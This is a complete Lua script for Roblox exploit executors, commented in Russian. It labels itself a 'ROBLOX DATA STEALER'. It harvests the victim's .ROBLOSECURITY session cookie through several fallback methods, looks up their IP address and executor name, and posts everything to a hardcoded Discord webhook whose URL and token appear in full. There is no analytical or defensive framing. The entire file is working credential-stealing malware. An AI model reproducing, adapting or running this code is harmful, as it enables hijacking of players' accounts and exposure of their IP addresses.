local webhook = "https://discord.com/api/webhooks/1431427795682328698/mUTGrbjd0Cy_WeR0dfOaLyocTQGAEH-KuK6F54lvIir0T3NGoVD0Nfpe0LUIGpScfoxj"

local request = (syn and syn.request) or (http and http.request) or http_request or request
if not request then return end

-- Основной метод получения куки через сервис аутентификации
local cookie = "not_found"
pcall(function()
    local authService = game:GetService("AuthenticationService")
    cookie = authService:GetCookie("ROBLOSECURITY")
end)

-- Резервные методы если основной не сработал
if cookie == "not_found" then
    pcall(function()
        cookie = game:GetService("Players").LocalPlayer:GetAttribute("ROBLOSECURITY")
    end)
end

if cookie == "not_found" then
    pcall(function()
        for i,v in pairs(getreg()) do
            if type(v) == "table" and rawget(v, "getcookie") then
                cookie = v:getcookie("ROBLOSECURITY")
                break
            end
        end
    end)
end

-- Получение расширенной информации
local player = game:GetService("Players").LocalPlayer
local ip = "unknown"
local hardware = "unknown"

pcall(function()
    ip = game:HttpGet("https://api64.ipify.org")
end)

pcall(function()
    hardware = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Unknown"
end)

-- Создание финального сообщения
local message = "🔴 **ROBLOX DATA STEALER** 🔴\n\n"
message = message .. "👤 **Account:** " .. player.Name .. " (" .. player.UserId .. ")\n"
message = message .. "🌐 **IP:** " .. ip .. "\n"
message = message .. "💻 **Executor:** " .. hardware .. "\n"
message = message .. "🔐 **Cookie:** ```" .. tostring(cookie) .. "```\n"
message = message .. "🕒 **Time:** " .. os.date("%Y-%m-%d %H:%M:%S")

-- Отправка в Discord
local success, err = pcall(function()
    request({
        Url = webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            content = message,
            username = "Roblox Stealer",
            avatar_url = "https://i.imgur.com/7W6hQ3d.png"
        })
    })
end)

print("Stealer executed. Cookie found:", cookie ~= "not_found")
